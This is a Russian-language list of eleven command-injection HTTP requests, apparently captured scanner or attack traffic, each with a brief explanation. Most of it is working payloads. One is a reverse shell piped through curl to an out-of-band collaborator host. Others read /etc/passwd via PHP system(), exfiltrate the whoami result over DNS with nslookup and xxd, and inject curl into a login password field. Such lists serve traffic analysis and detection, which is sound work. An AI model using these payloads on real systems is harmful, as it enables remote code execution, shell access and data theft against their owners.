# 1. Command Injection (выполнение команд ОС)

### Запрос 1
```http
/mnaryr.php?cmd=echo+VXrceviabsZQ
```
Действие: проверка исполнения команды echo (вывод случайной строки).

### Запрос 2
```http
/qsr_server/device/getThumbnail?sourceUri=\%27%2b-%253brm%2b[TMP]/f%253bmkfifo%2b\[TMP\]/f%253bcat%2b[TMP]/f|/bin/sh%2b-i%2b2%3E%25261|curl%2bhttp%253a//d8hk9mlq3g2isfoce0pgy9dce333xi1u5.oast.live%2b%3E[TMP]/f%253b\%27;&targetUri=%2[TMP]%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
```
Действие: сложная команда: удаление файла, создание именованного канала, запуск /bin/sh с обратным вызовом через curl на коллаборатор (reverse shell).

### Запрос 3
```http
/?filter=%27%2bpi(print(%24a%3d%27system%27))%2b%24a(%27cat%20/etc/passwd%27)%2b%27
```
Действие: выполнение cat /etc/passwd через PHP-функцию system с использованием pi().

### Запрос 4
```http
/script?command=|%20nslookup%20d8hk9mlq3g2isfoce0pgeuokmtswxq5t9.oast.live
```
Действие: запускает nslookup на внешний хост для проверки RCE.

### Запрос 5
```http
/cms_changeDeviceContext.esp?device=aaaaa:a%27%22;user|s.%221337%22;
```
Действие: инъекция с символами ; и | – попытка выполнения команд через параметр device.

### Запрос 6
```http
/processVariavel.php?gridValoresPopHidden=echo%20system(%22ipconfig%22);
```
Действие: выполняет ipconfig через PHP system.

### Запрос 7
```http
/mbilling/lib/icepay/icepay.php?democ=3EtXayMZjFu2FHXnIRYv7lIunya;curl%20d8ju5uj5ls8pboulifi0bmx357zu19km5.oast.site;
```
Действие: выполняет curl на внешний хост для подтверждения доступа.

### Запрос 8
```http
/mbilling/lib/icepay/icepay.php?democ=3EtXayMZjFu2FHXnIRYv7lIunya;sleep%207;
```
Действие: выполняет sleep 7 – тест на задержку (blind RCE).

### Запрос 9
```http
/downloader.php?file=%3Becho+CVE-2023-23333|rev%00.zip
```
Действие: выполняет echo CVE-2023-23333 | rev (проверка исполнения команд через параметр file).

### Запрос 10
```http
/getsamplebacklog?arg1=2d0ows2x9anpzaorxi9h4csmai08jjor&arg2=%7b%22type%22%3a%22client%22%2c%22earliest%22%3a%221676976316.328%7c%7cnslookup%20%24(xxd%20-pu%20%3c%3c%3c%20%24(whoami)).d8ju5uj5ls8pboulifi0xsfddkgip9ata.oast.site%7c%7cx%22%2c%22latest%22%3a1676976916.328%2c%22origins%22%3a%5b%7b%22ip%22%3a%22avsw.ru%22%2c%22source%22%3a0%7d%5d%2c%22seriesID%22%3a3%7d&arg3=undefined&arg4=undefined&arg5=undefined&arg6=undefined&arg7=undefined
```
Действие: выполняет nslookup с подстановкой результата whoami (закодирован через xxd) для кражи имени пользователя через DNS.

### Запрос 11
```http
/forms/doLogin?login_username=admin&password=password$(curl%20d8ju5uj5ls8pboulifi0acht4itue5asy.oast.site)&x=0&y=0
```
Действие: внедрение команды curl в поле пароля (подстановка результата выполнения).

----
